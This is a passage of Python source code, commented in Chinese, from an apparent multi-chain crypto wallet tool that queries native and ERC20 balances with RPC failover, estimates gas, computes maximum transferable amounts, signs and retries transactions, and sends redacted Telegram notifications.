                            # 获取交易计数
                            nonce = w3.eth.get_transaction_count(address)
                            rpc_time = time.time() - rpc_start
                            return True, nonce > 0, rpc_time, rpc_url
                    return False, False, time.time() - rpc_start, rpc_url
                except Exception as e:
                    return False, False, time.time() - rpc_start, rpc_url
            
            # 并发测试RPC
            with ThreadPoolExecutor(max_workers=5) as executor:
                future_to_rpc = {executor.submit(test_single_rpc, rpc): rpc for rpc in test_rpcs}
                
                try:
                    for future in as_completed(future_to_rpc, timeout=timeout):
                        try:
                            success, has_history, rpc_time, rpc_url = future.result()
                            if success:
                                elapsed = time.time() - start_time
                                return network_key, has_history, elapsed, f"成功({rpc_time:.2f}s)"
                        except Exception:
                            continue
                except concurrent.futures.TimeoutError:
                    pass
            
            # 如果所有RPC都失败或超时
            elapsed = time.time() - start_time
            return network_key, False, elapsed, "所有RPC超时"
            
        except Exception as e:
            elapsed = time.time() - start_time
            return network_key, False, elapsed, f"错误: {str(e)[:30]}"

    def _auto_optimize_on_startup(self):
        """启动时自动优化网络和调速参数"""
        try:
            print(f"{Fore.CYAN}⚡ 启动智能调速系统...{Style.RESET_ALL}")
            
            # 重置日常API限制
            self.throttler.reset_daily_limits()
            
            # 根据可用网络数量调整初始并发数
            total_networks = len(self.networks)
            if total_networks > 0:
                # 初始并发数 = min(网络数量, 最大值)，但不少于最小值
                optimal_initial = min(max(total_networks // 3, self.throttler.adaptive_config['min_workers']), 
                                    self.throttler.adaptive_config['max_workers'])
                self.throttler.adaptive_config['current_workers'] = optimal_initial
                
            print(f"{Fore.GREEN}✅ 智能调速系统已启动 (初始并发: {self.throttler.adaptive_config['current_workers']}){Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ 智能调速初始化警告: {e}{Style.RESET_ALL}")

    def smart_rpc_call(self, rpc_url: str, call_func, call_name: str = "RPC调用"):
        """智能RPC调用包装器，集成调速和统计"""
        start_time = time.time()
        success = False
        error_msg = None
        
        try:
            result = call_func()
            success = True
            return result
        except Exception as e:
            error_msg = str(e)
            raise e
        finally:
            # 记录调用统计
            if self.throttler_enabled:
                response_time = time.time() - start_time
                self.throttler.record_request(rpc_url, success, response_time, error_msg)

    def get_balance_with_multi_rpc(self, address: str, network: str, max_retries: int = 3) -> Tuple[float, str]:
        """使用多RPC故障转移获取地址原生代币余额，返回(余额, 币种符号)"""
        if network not in self.networks:
            return 0.0, "?"
        
        network_info = self.networks[network]
        currency = network_info['native_currency']
        rpc_urls = network_info['rpc_urls']
        
        # 按优先级尝试每个RPC
        for rpc_index, rpc_url in enumerate(rpc_urls):
            # 跳过被屏蔽的RPC
            if rpc_url in self.blocked_rpcs:
                continue
                
            for attempt in range(max_retries):
                try:
                    # 创建临时Web3连接
                    w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': 15}))
                    
                    # 验证连接
                    if not w3.is_connected():
                        if attempt == max_retries - 1:
                            print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 连接失败，尝试下一个...{Style.RESET_ALL}")
                        break
                    
                    # 验证链ID
                    try:
                        chain_id = w3.eth.chain_id
                        if chain_id != network_info['chain_id']:
                            if attempt == max_retries - 1:
                                print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 链ID不匹配，尝试下一个...{Style.RESET_ALL}")
                            break
                    except:
                        if attempt == max_retries - 1:
                            print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 链ID验证失败，尝试下一个...{Style.RESET_ALL}")
                        break
                    
                    # 获取余额
                    balance_wei = w3.eth.get_balance(w3.to_checksum_address(address))
                    balance = w3.from_wei(balance_wei, 'ether')
                    
                    if rpc_index > 0 or attempt > 0:
                        print(f"      {Fore.GREEN}✅ RPC-{rpc_index + 1} 查询成功 (尝试{attempt + 1}){Style.RESET_ALL}")
                    
                    return float(balance), currency
                    
                except Exception as e:
                    if attempt == max_retries - 1:
                        error_msg = str(e)[:50] + "..." if len(str(e)) > 50 else str(e)
                        print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 查询失败: {error_msg}{Style.RESET_ALL}")
                        self.logger.warning(f"RPC-{rpc_index + 1} 余额查询失败 {address} on {network}: {e}")
                    continue
        
        # 所有RPC都失败了
        print(f"      {Fore.RED}❌ 所有RPC查询失败{Style.RESET_ALL}")
        self.logger.error(f"所有RPC余额查询失败 {address} on {network}")
        return 0.0, "?"

    def get_balance(self, address: str, network: str) -> Tuple[float, str]:
        """获取地址原生代币余额，返回(余额, 币种符号) - 优先使用已建立的连接，失败时使用多RPC故障转移"""
        try:
            # 首先尝试使用已建立的连接
            if network in self.web3_connections:
                w3 = self.web3_connections[network]
                balance_wei = w3.eth.get_balance(w3.to_checksum_address(address))
                balance = w3.from_wei(balance_wei, 'ether')
                currency = self.networks[network]['native_currency']
                return float(balance), currency
            else:
                # 如果没有已建立的连接，使用多RPC故障转移
                return self.get_balance_with_multi_rpc(address, network)
                
        except Exception as e:
            self.logger.warning(f"主连接余额查询失败 {address} on {network}: {e}，尝试多RPC故障转移")
            # 主连接失败，使用多RPC故障转移
            return self.get_balance_with_multi_rpc(address, network)

    def get_token_balance_with_multi_rpc(self, address: str, token_symbol: str, network: str, max_retries: int = 3) -> Tuple[float, str, str]:
        """使用多RPC故障转移获取ERC20代币余额，返回(余额, 代币符号, 代币合约地址)"""
        if network not in self.networks:
            return 0.0, "?", "?"
            
        if token_symbol not in self.tokens:
            return 0.0, "?", "?"
        
        token_config = self.tokens[token_symbol]
        if network not in token_config['contracts']:
            return 0.0, "?", "?"
        
        contract_address = token_config['contracts'][network]
        network_info = self.networks[network]
        rpc_urls = network_info['rpc_urls']
        
        # 按优先级尝试每个RPC
        for rpc_index, rpc_url in enumerate(rpc_urls):
            # 跳过被屏蔽的RPC
            if rpc_url in self.blocked_rpcs:
                continue
                
            for attempt in range(max_retries):
                try:
                    # 创建临时Web3连接
                    w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': 15}))
                    
                    # 验证连接
                    if not w3.is_connected():
                        if attempt == max_retries - 1:
                            print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 连接失败，尝试下一个...{Style.RESET_ALL}")
                        break
                    
                    # 验证链ID
                    try:
                        chain_id = w3.eth.chain_id
                        if chain_id != network_info['chain_id']:
                            if attempt == max_retries - 1:
                                print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 链ID不匹配，尝试下一个...{Style.RESET_ALL}")
                            break
                    except:
                        if attempt == max_retries - 1:
                            print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 链ID验证失败，尝试下一个...{Style.RESET_ALL}")
                        break
                    
                    # 创建合约实例
                    checksum_contract = w3.to_checksum_address(contract_address)
                    
                    # 验证合约是否存在
                    try:
                        contract_code = w3.eth.get_code(checksum_contract)
                        if contract_code == '0x' or len(contract_code) <= 2:
                            if attempt == max_retries - 1:
                                print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 合约不存在或未部署，尝试下一个...{Style.RESET_ALL}")
                            break  # 合约不存在，尝试下一个RPC
                    except Exception:
                        if attempt == max_retries - 1:
                            print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 无法验证合约，尝试下一个...{Style.RESET_ALL}")
                        break
                    
                    contract = w3.eth.contract(
                        address=checksum_contract,
                        abi=self.erc20_abi
                    )
                    
                    # 获取代币余额，增加更详细的错误处理
                    try:
                        balance_raw = contract.functions.balanceOf(w3.to_checksum_address(address)).call()
                    except Exception as balance_err:
                        balance_error_str = str(balance_err).lower()
                        if any(keyword in balance_error_str for keyword in [
                            'could not transact', 'contract deployed', 'chain synced',
                            'execution reverted', 'invalid opcode', 'out of gas'
                        ]):
                            if attempt == max_retries - 1:
                                print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 合约调用失败: {str(balance_err)[:40]}...{Style.RESET_ALL}")
                            continue  # 重试当前RPC
                        else:
                            raise balance_err  # 其他错误直接抛出
                    
                    # 获取代币元数据（缓存）
                    cache_key = f"{network}:{checksum_contract.lower()}"
                    cached = self.token_metadata_cache.get(cache_key)
                    if cached and 'decimals' in cached and isinstance(cached['decimals'], int):
                        decimals = cached['decimals']
                        symbol_out = cached.get('symbol', token_config['symbol'])
                    else:
                        # 获取代币精度
                        try:
                            decimals = contract.functions.decimals().call()
                        except Exception:
                            decimals = 18  # 默认精度
                        # 获取代币符号（优先链上，回退配置）
                        try:
                            onchain_symbol = contract.functions.symbol().call()
                            symbol_out = onchain_symbol if isinstance(onchain_symbol, str) and onchain_symbol else token_config['symbol']
                        except Exception:
                            symbol_out = token_config['symbol']
                        # 写入缓存
                        self.token_metadata_cache[cache_key] = {'decimals': int(decimals), 'symbol': symbol_out}
                    
                    # 转换为人类可读格式
                    balance = balance_raw / (10 ** decimals)
                    
                    # 记录活跃代币
                    if balance > 0:
                        self._record_active_token(address, network, token_symbol)
                    
                    if rpc_index > 0 or attempt > 0:
                        print(f"      {Fore.GREEN}✅ RPC-{rpc_index + 1} 代币查询成功 (尝试{attempt + 1}){Style.RESET_ALL}")
                    
                    return float(balance), symbol_out, contract_address
                    
                except Exception as e:
                    if attempt == max_retries - 1:
                        error_msg = str(e)[:50] + "..." if len(str(e)) > 50 else str(e)
                        print(f"      {Fore.YELLOW}⚠️ RPC-{rpc_index + 1} 代币查询失败: {error_msg}{Style.RESET_ALL}")
                        self.logger.warning(f"RPC-{rpc_index + 1} 代币余额查询失败 {token_symbol} {address} on {network}: {e}")
                    continue
        
        # 所有RPC都失败了
        print(f"      {Fore.RED}❌ 所有RPC代币查询失败{Style.RESET_ALL}")
        self.logger.error(f"所有RPC代币余额查询失败 {token_symbol} {address} on {network}")
        return 0.0, "?", "?"

    def get_token_balance(self, address: str, token_symbol: str, network: str) -> Tuple[float, str, str]:
        """获取ERC20代币余额，返回(余额, 代币符号, 代币合约地址) - 优先使用已建立的连接，失败时使用多RPC故障转移"""
        try:
            # 首先尝试使用已建立的连接
            if network in self.web3_connections:
                if token_symbol not in self.tokens:
                    return 0.0, "?", "?"
                
                token_config = self.tokens[token_symbol]
                if network not in token_config['contracts']:
                    return 0.0, "?", "?"
                
                contract_address = token_config['contracts'][network]
                w3 = self.web3_connections[network]
                
                # 创建合约实例
                checksum_contract = w3.to_checksum_address(contract_address)
                
                # 验证合约是否存在
                try:
                    contract_code = w3.eth.get_code(checksum_contract)
                    if contract_code == '0x' or len(contract_code) <= 2:
                        self.logger.warning(f"合约不存在或未部署: {checksum_contract} on {network}")
                        return 0.0, "?", "?"
                except Exception as e:
                    self.logger.warning(f"无法验证合约 {checksum_contract} on {network}: {e}")
                    # 继续尝试，可能是RPC问题
                
                contract = w3.eth.contract(
                    address=checksum_contract,
                    abi=self.erc20_abi
                )
                
                # 获取代币余额，增加更详细的错误处理
                try:
                    balance_raw = contract.functions.balanceOf(w3.to_checksum_address(address)).call()
                except Exception as balance_err:
                    balance_error_str = str(balance_err).lower()
                    if any(keyword in balance_error_str for keyword in [
                        'could not transact', 'contract deployed', 'chain synced',
                        'execution reverted', 'invalid opcode', 'out of gas'
                    ]):
                        self.logger.warning(f"合约调用失败，尝试多RPC: {balance_err}")
                        raise balance_err  # 让外层捕获并使用多RPC
                    else:
                        raise balance_err
                
                # 获取代币元数据（缓存）
                cache_key = f"{network}:{checksum_contract.lower()}"
                cached = self.token_metadata_cache.get(cache_key)
                if cached and 'decimals' in cached and isinstance(cached['decimals'], int):
                    decimals = cached['decimals']
                    symbol_out = cached.get('symbol', token_config['symbol'])
                else:
                    # 获取代币精度
                    try:
                        decimals = contract.functions.decimals().call()
                    except Exception:
                        decimals = 18  # 默认精度
                    # 获取代币符号（优先链上，回退配置）
                    try:
                        onchain_symbol = contract.functions.symbol().call()
                        symbol_out = onchain_symbol if isinstance(onchain_symbol, str) and onchain_symbol else token_config['symbol']
                    except Exception:
                        symbol_out = token_config['symbol']
                    # 写入缓存
                    self.token_metadata_cache[cache_key] = {'decimals': int(decimals), 'symbol': symbol_out}
                
                # 转换为人类可读格式
                balance = balance_raw / (10 ** decimals)
                # 记录活跃代币
                if balance > 0:
                    self._record_active_token(address, network, token_symbol)
                return float(balance), symbol_out, contract_address
            else:
                # 如果没有已建立的连接，使用多RPC故障转移
                return self.get_token_balance_with_multi_rpc(address, token_symbol, network)
            
        except Exception as e:
            self.logger.warning(f"主连接代币余额查询失败 {token_symbol} {address} on {network}: {e}，尝试多RPC故障转移")
            # 主连接失败，使用多RPC故障转移
            return self.get_token_balance_with_multi_rpc(address, token_symbol, network)

    def get_all_balances(self, address: str, network: str) -> Dict:
        """获取地址在指定网络上的所有余额（原生代币 + ERC20代币）
        首次扫描：全量遍历 self.tokens
        后续扫描：仅扫描用户主动添加或最近活跃的代币（命中优先清单），降低链上调用压力
        """
        balances = {}
        
        # 获取原生代币余额
        native_balance, native_currency = self.get_balance(address, network)
        if native_balance > 0:
            balances['native'] = {
                'balance': native_balance,
                'symbol': native_currency,
                'type': 'native',
                'contract': 'native'
            }
        
        # 构建本轮需要扫描的代币列表
        token_symbols_to_scan: List[str] = []
        if not self.address_full_scan_done.get(address, False):
            # 首轮全量
            token_symbols_to_scan = list(self.tokens.keys())
        else:
            # 后续仅扫描：用户主动添加 + 最近活跃（地址/网络维度）
            recent_active = self._get_recent_active_tokens(address, network)
            # 去重并保持顺序：用户添加的优先，其次活跃
            seen = set()
            for sym in list(self.user_added_tokens) + recent_active:
                up = sym.upper()
                if up in self.tokens and up not in seen:
                    token_symbols_to_scan.append(up)
                    seen.add(up)
            # 若为空，退化为全量的一小部分（例如稳定币/热门代币），避免完全不查
            if not token_symbols_to_scan:
                for fallback in ['USDT','USDC','DAI']:
                    if fallback in self.tokens:
                        token_symbols_to_scan.append(fallback)
        
        # 扫描ERC20余额
        for token_symbol in token_symbols_to_scan:
            token_balance, token_sym, contract_addr = self.get_token_balance(address, token_symbol, network)
            if token_balance > 0:
                balances[token_symbol] = {
                    'balance': token_balance,
                    'symbol': token_sym,
                    'type': 'erc20',
                    'contract': contract_addr
                }
        
        # 统计逻辑：若是首轮扫描，标记该地址已完成并记时间
        if not self.address_full_scan_done.get(address, False):
            self.address_full_scan_done[address] = True
            self.last_full_scan_time = time.time()
        
        return balances

    def estimate_gas_cost(self, network: str, token_type: str = 'native', retry_multiplier: float = 1.0) -> Tuple[float, str]:
        """智能估算Gas费用，返回(gas费用ETH, 币种符号)"""
        try:
            if network not in self.web3_connections:
                return 0.0, "?"
            
            w3 = self.web3_connections[network]
            
            # 获取当前Gas价格
            try:
                gas_price = w3.eth.gas_price
                # 在重试时适当提高gas价格
                gas_price = int(gas_price * retry_multiplier)
            except Exception as e:
                self.logger.warning(f"获取Gas价格失败 {network}: {e}，使用默认值")
                gas_price = w3.to_wei(self.gas_price_gwei * retry_multiplier, 'gwei')
            
            # 根据交易类型估算Gas限制
            if token_type == 'native':
                gas_limit = int(21000 * retry_multiplier)  # 原生代币转账，重试时增加
            else:
                gas_limit = int(65000 * retry_multiplier)  # ERC20代币转账，重试时增加
            
            # 计算总Gas费用
            gas_cost = gas_limit * gas_price
            gas_cost_eth = w3.from_wei(gas_cost, 'ether')
            currency = self.networks[network]['native_currency']
            
            return float(gas_cost_eth), currency
            
        except Exception as e:
            self.logger.error(f"估算Gas费用失败 {network}: {e}")
            return 0.001, "ETH"  # 返回保守估算

    def estimate_gas_for_transaction(self, w3, transaction: dict, retry_multiplier: float = 1.0) -> int:
        """智能估算交易所需的Gas，支持重试调整"""
        try:
            # 尝试估算实际需要的gas
            estimated_gas = w3.eth.estimate_gas(transaction)
            # 添加20%的缓冲，并应用重试乘数
            safe_gas = int(estimated_gas * 1.2 * retry_multiplier)
            
            # 设置合理的上下限
            min_gas = 21000 if transaction.get('data') == '0x' or not transaction.get('data') else 50000
            max_gas = 500000  # 防止gas过高
            
            return max(min_gas, min(safe_gas, max_gas))
            
        except Exception as e:
            self.logger.warning(f"Gas估算失败: {e}，使用默认值")
            # 根据交易类型返回默认值
            if transaction.get('data') == '0x' or not transaction.get('data'):
                return int(21000 * retry_multiplier)  # 简单转账
            else:
                return int(65000 * retry_multiplier)  # 合约调用

    def calculate_optimal_transfer_amount(self, address: str, network: str, token_type: str = 'native', 
                                         token_balance: float = 0, target_amount: float = None) -> Tuple[bool, float, str]:
        """智能计算最优转账金额，确保最低余额也能转账
        返回: (是否可转账, 实际可转账金额, 说明信息)
        """
        try:
            # 获取原生代币余额（用于支付Gas）
            native_balance, native_currency = self.get_balance(address, network)
            
            if token_type == 'native':
                # 原生代币转账：需要预留Gas费用
                # 使用保守的Gas估算，确保交易成功
                gas_cost, _ = self.estimate_gas_cost(network, token_type, retry_multiplier=1.2)
                
                # 计算可转账的最大金额
                max_transferable = native_balance - gas_cost - 0.0001  # 保留一点缓冲
                
                if max_transferable <= 0:
                    return False, 0.0, f"余额不足支付Gas费用 (余额: {native_balance:.6f}, 需要Gas: {gas_cost:.6f} {native_currency})"
                
                # 如果指定了目标金额，选择较小值
                if target_amount is not None:
                    actual_amount = min(target_amount, max_transferable)
                else:
                    actual_amount = max_transferable
                
                return True, actual_amount, f"可转账 {actual_amount:.6f} {native_currency} (预留Gas: {gas_cost:.6f})"
                
            else:
                # ERC20代币转账：检查代币余额和Gas费用
                if token_balance <= 0:
                    return False, 0.0, "代币余额为0"
                
                # 使用保守的Gas估算
                gas_cost, _ = self.estimate_gas_cost(network, token_type, retry_multiplier=1.2)
                
                if native_balance < gas_cost:
                    return False, 0.0, f"原生代币不足支付Gas费用 (余额: {native_balance:.6f}, 需要Gas: {gas_cost:.6f} {native_currency})"
                
                # 如果指定了目标金额，选择较小值
                if target_amount is not None:
                    actual_amount = min(target_amount, token_balance)
                else:
                    actual_amount = token_balance
                
                return True, actual_amount, f"可转账 {actual_amount:.6f} 代币 (Gas费用: {gas_cost:.6f} {native_currency})"
                
        except Exception as e:
            self.logger.error(f"计算最优转账金额失败: {e}")
            return False, 0.0, f"计算失败: {str(e)[:50]}"

    def can_transfer(self, address: str, network: str, token_type: str = 'native', token_balance: float = 0) -> Tuple[bool, str]:
        """智能判断是否可以转账，返回(是否可转账, 原因) - 兼容原有接口"""
        can_transfer, amount, reason = self.calculate_optimal_transfer_amount(address, network, token_type, token_balance)
        return can_transfer, reason

    def send_telegram_notification(self, message: str) -> bool:
        """发送Telegram通知"""
        if not self.telegram_enabled or not self.telegram_bot_token or not self.telegram_chat_id:
            return False
        
        try:
            import requests
            # 降噪：在窗口期内去重
            key = str(hash(message))
            now_ts = time.time()
            last_ts = self._telegram_last_sent.get(key, 0.0)
            if now_ts - last_ts < self.telegram_noise_cooldown:
                return True
            # 过滤高风险字段
            redacted = message
            import re
            for pat in self.redact_patterns:
                redacted = re.sub(pat, "[REDACTED]", redacted)
            # 限制长度
            if len(redacted) > 3500:
                redacted = redacted[:3500] + "\n…(truncated)"
            # 简单Markdown转义
            def escape_md(s: str) -> str:
                return s.replace("_", r"\_").replace("*", r"\*").replace("[", r"\[").replace("`", r"\`")
            redacted = escape_md(redacted)
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            data = {
                'chat_id': self.telegram_chat_id,
                'text': redacted,
                'parse_mode': 'Markdown'
            }
            # 带退避重试
            backoff = self.telegram_base_backoff
            for attempt in range(self.telegram_max_retries):
                try:
                    response = requests.post(url, data=data, timeout=10)
                    if response.status_code == 200:
                        self._telegram_last_sent[key] = now_ts
                        self.logger.info("Telegram通知发送成功")
                        return True
                    # 429/5xx做退避
                    if response.status_code in (429, 500, 502, 503, 504):
                        time.sleep(backoff)
                        backoff *= 2
                        continue
                    self.logger.error(f"Telegram通知发送失败: {response.status_code}")
                    return False
                except Exception:
                    time.sleep(backoff)
                    backoff *= 2
            return False
                
        except Exception as e:
            self.logger.error(f"发送Telegram通知失败: {e}")
            return False

    def is_gas_error(self, error: Exception) -> bool:
        """判断是否是Gas相关的错误"""
        error_str = str(error).lower()
        gas_error_keywords = [
            'intrinsic gas too low',
            'gas limit reached',
            'out of gas',
            'gas required exceeds allowance',
            'insufficient gas',
            'gas price too low',
            'transaction underpriced'
        ]
        return any(keyword in error_str for keyword in gas_error_keywords)

    def send_transaction_with_retry(self, w3, transaction: dict, private_key: str, max_retries: int = 3) -> str:
        """智能重试发送交易，自动调整Gas参数"""
        retry_multipliers = [1.0, 1.5, 2.0, 2.5]  # Gas调整倍数
        
        for attempt in range(max_retries + 1):
            try:
                retry_multiplier = retry_multipliers[min(attempt, len(retry_multipliers) - 1)]
                
                if attempt > 0:
                    print(f"      {Fore.YELLOW}🔄 第{attempt + 1}次尝试 (Gas倍数: {retry_multiplier}x)...{Style.RESET_ALL}")
                    
                    # 重新估算Gas
                    estimated_gas = self.estimate_gas_for_transaction(w3, transaction, retry_multiplier)
                    transaction['gas'] = estimated_gas
                    
                    # 调整Gas价格
                    try:
                        current_gas_price = w3.eth.gas_price
                        transaction['gasPrice'] = int(current_gas_price * retry_multiplier)
                    except:
                        transaction['gasPrice'] = w3.to_wei(self.gas_price_gwei * retry_multiplier, 'gwei')
                    
                    # 更新nonce以防被占用
                    from_address = w3.to_checksum_address(w3.eth.account.from_key(private_key).address)
                    transaction['nonce'] = w3.eth.get_transaction_count(from_address)
                
                # 签名并发送交易
                signed_txn = w3.eth.account.sign_transaction(transaction, private_key)
                tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
                
                if attempt > 0:
                    print(f"      {Fore.GREEN}✅ 重试成功！交易已发送{Style.RESET_ALL}")
                
                return tx_hash.hex()
                
            except Exception as e:
                if attempt == max_retries:
                    # 最后一次尝试失败，抛出异常
                    raise e
                
                if self.is_gas_error(e):
                    print(f"      {Fore.YELLOW}⚠️ Gas错误: {str(e)[:50]}... 正在调整Gas参数重试{Style.RESET_ALL}")
                    continue
                else:
                    # 非Gas错误，直接抛出
                    raise e
        
        raise Exception("重试次数已用完")

    def update_transfer_stats(self, success: bool, network: str, token_symbol: str, amount: float = 0):
        """更新转账统计"""
        try:
            self.transfer_stats['total_attempts'] += 1
            
            if success:
                self.transfer_stats['successful_transfers'] += 1
                self.transfer_stats['total_value_transferred'] += amount
            else:
                self.transfer_stats['failed_transfers'] += 1
            
            # 按网络统计
            if network not in self.transfer_stats['by_network']:
                self.transfer_stats['by_network'][network] = {'success': 0, 'failed': 0}
            
            if success:
                self.transfer_stats['by_network'][network]['success'] += 1
            else:
                self.transfer_stats['by_network'][network]['failed'] += 1
            
            # 按代币统计
            if token_symbol not in self.transfer_stats['by_token']:
                self.transfer_stats['by_token'][token_symbol] = {'success': 0, 'failed': 0, 'amount': 0.0}
            
            if success:
                self.transfer_stats['by_token'][token_symbol]['success'] += 1
                self.transfer_stats['by_token'][token_symbol]['amount'] += amount
            else:
                self.transfer_stats['by_token'][token_symbol]['failed'] += 1
                
        except Exception as e:
            self.logger.error(f"更新转账统计失败: {e}")

    def get_stats_summary(self) -> str:
        """获取统计摘要"""
        try:
            stats = self.transfer_stats
            success_rate = (stats['successful_transfers'] / stats['total_attempts'] * 100) if stats['total_attempts'] > 0 else 0
            
            summary = f"""
📊 *转账统计摘要*
━━━━━━━━━━━━━━━━━━━━
📈 总尝试次数: {stats['total_attempts']}
✅ 成功转账: {stats['successful_transfers']}
❌ 失败转账: {stats['failed_transfers']}
📊 成功率: {success_rate:.1f}%
💰 总转账价值: {stats['total_value_transferred']:.6f} ETH等价值

🌐 *网络统计*:
"""
            
            for network, net_stats in stats['by_network'].items():
                network_name = self.networks.get(network, {}).get('name', network)
                summary += f"• {network_name}: ✅{net_stats['success']} ❌{net_stats['failed']}\n"
            
            summary += "\n🪙 *代币统计*:\n"
            for token, token_stats in stats['by_token'].items():
                summary += f"• {token}: ✅{token_stats['success']} ❌{token_stats['failed']}"
                if token_stats['amount'] > 0:
                    summary += f" (💰{token_stats['amount']:.6f})"
                summary += "\n"
            
            # 添加智能调速统计
            if self.throttler_enabled:
                throttler_stats = self.throttler.get_stats_summary()
                summary += f"""
⚡ *智能调速状态*
━━━━━━━━━━━━━━━━━━━━
🔧 当前并发数: {throttler_stats['current_workers']}
💚 健康RPC: {throttler_stats['healthy_rpcs']}/{throttler_stats['total_rpcs']}
📊 平均健康度: {throttler_stats['avg_health']:.2f}
📞 API调用统计:
"""
                for api_type, calls in throttler_stats['api_usage'].items():
                    if api_type == 'ankr':
                        limit = "5,000"
                    elif api_type == 'alchemy':
                        limit = "1,000,000"
                    else:
                        limit = "∞"
                    summary += f"• {api_type.title()}: {calls:,}/{limit}\n"
            
            return summary
            
        except Exception as e:
            self.logger.error(f"获取统计摘要失败: {e}")
            return "统计数据获取失败"

    def test_rpc_connection(self, rpc_url: str, expected_chain_id: int, timeout: int = 5, quick_test: bool = False) -> bool:
        """测试单个RPC连接，支持HTTP(S)和WebSocket"""
        import signal
        import time
        
        # 如果是快速测试（用于ChainList批量导入），使用3秒超时，避免误判
        if quick_test:
            timeout = 3
            
        def timeout_handler(signum, frame):
            raise TimeoutError(f"RPC连接超时 ({timeout}秒)")
        
        try:
            from web3 import Web3
            
            # 设置超时信号
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(timeout)
            
            start_time = time.time()
            
            # 根据URL类型选择提供者
            if rpc_url.startswith(('ws://', 'wss://')):
                provider = Web3.WebsocketProvider(rpc_url, websocket_kwargs={'timeout': timeout})
            else:
                provider = Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': timeout})
            
            w3 = Web3(provider)
            
            # 测试连接
            if not w3.is_connected():
                return False
            
            # 验证链ID
            chain_id = w3.eth.chain_id
            elapsed = time.time() - start_time
            
            # 如果是快速测试且超过3秒，也视为失败
            if quick_test and elapsed > 3.0:
                return False
                
            return chain_id == expected_chain_id
            
        except (TimeoutError, Exception):
            return False
        finally:
            # 取消超时信号
            signal.alarm(0)

    def test_rpc_concurrent(self, rpc_url: str, expected_chain_id: int, timeout: int = 3) -> tuple:
        """并发测试单个RPC连接，返回(是否成功, 响应时间, RPC类型)"""
        import time
        start_time = time.time()
        
        try:
            from web3 import Web3
            w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': timeout}))
            
            # 测试连接
            if not w3.is_connected():
                elapsed = time.time() - start_time
                return False, elapsed, self.get_rpc_type(rpc_url)
            
            # 验证链ID
            chain_id = w3.eth.chain_id
            success = chain_id == expected_chain_id
            response_time = time.time() - start_time
            # 记录RPC评分
            self._record_rpc_stat(expected_chain_id, rpc_url, success, response_time)
            return success, response_time, self.get_rpc_type(rpc_url)
            
        except Exception:
            elapsed = time.time() - start_time
            self._record_rpc_stat(expected_chain_id, rpc_url, False, elapsed)
            return False, elapsed, self.get_rpc_type(rpc_url)

    def get_rpc_type(self, rpc_url: str) -> str:
        """识别RPC类型"""
        if 'alchemy.com' in rpc_url:
            return 'Alchemy'
        elif 'ankr.com' in rpc_url:
            return 'Ankr'
        else:
            return '公共节点'
    
    def is_public_rpc(self, rpc_url: str) -> bool:
        """判断是否为公共RPC节点（可运行时更新的特征列表）"""
        for indicator in self.private_rpc_indicators:
            if indicator in rpc_url.lower():
                return False
        return True

    def update_private_rpc_indicators(self, indicators: List[str]) -> None:
        """运行时更新私有RPC特征列表"""
        cleaned = []
        for s in indicators:
            if isinstance(s, str) and s.strip():
                cleaned.append(s.strip().lower())
        if cleaned:
            self.private_rpc_indicators = cleaned

    def get_token_info(self, token_address: str, network_key: str) -> Optional[Dict]:
        """获取代币信息（名称、符号、精度）"""
        if network_key not in self.web3_connections:
            return None
        
        web3 = self.web3_connections[network_key]
        
        try:
            # 验证地址格式
            if not web3.is_address(token_address):
                return None
            
            # 将地址转换为校验和格式
            token_address = web3.to_checksum_address(token_address)
            
            # 创建代币合约实例
            token_contract = web3.eth.contract(
                address=token_address,
                abi=self.erc20_abi
            )
            
            # 获取代币信息
            try:
                name = token_contract.functions.name().call()
            except:
                name = "Unknown Token"
            
            try:
                symbol = token_contract.functions.symbol().call()
            except:
                symbol = "UNK"
            
            try:
                decimals = token_contract.functions.decimals().call()
            except:
                decimals = 18
            
            # 尝试获取余额来验证合约是否有效
            try:
                # 使用零地址测试
                zero_address = "0x0000000000000000000000000000000000000000"
                token_contract.functions.balanceOf(zero_address).call()
            except:
                return None
            
            return {
                'name': name,
                'symbol': symbol,
                'decimals': decimals,
                'address': token_address,
                'network': network_key
            }
            
        except Exception as e:
            print(f"{Fore.RED}❌ 获取代币信息失败: {e}{Style.RESET_ALL}")
            return None

    def add_custom_token(self, token_info: Dict) -> bool:
        """添加自定义代币到tokens配置"""
        try:
            symbol = token_info['symbol'].upper()
            network = token_info['network']
            address = token_info['address']
            
            # 检查是否已存在相同符号的代币
            if symbol in self.tokens:
                # 如果已存在，添加到该代币的网络配置中
                if network not in self.tokens[symbol]['contracts']:
                    self.tokens[symbol]['contracts'][network] = address
                    print(f"{Fore.GREEN}✅ 已将 {symbol} 添加到 {self.networks[network]['name']}{Style.RESET_ALL}")
                    # 标记为用户主动添加
                    self.user_added_tokens.add(symbol)
                    return True
                else:
                    print(f"{Fore.YELLOW}⚠️ {symbol} 在 {self.networks[network]['name']} 上已存在{Style.RESET_ALL}")
                    return False
            else:
                # 创建新的代币配置
                self.tokens[symbol] = {
                    'name': token_info['name'],
                    'symbol': symbol,
                    'contracts': {
                        network: address
                    }
                }
                # 标记为用户主动添加
                self.user_added_tokens.add(symbol)
                print(f"{Fore.GREEN}✅ 已添加新代币 {symbol} ({token_info['name']}){Style.RESET_ALL}")
                return True
                
        except Exception as e:
            print(f"{Fore.RED}❌ 添加自定义代币失败: {e}{Style.RESET_ALL}")
            return False

    def _record_active_token(self, address: str, network: str, token_symbol: str) -> None:
        """记录某地址在网络上的活跃代币（最近余额>0）"""
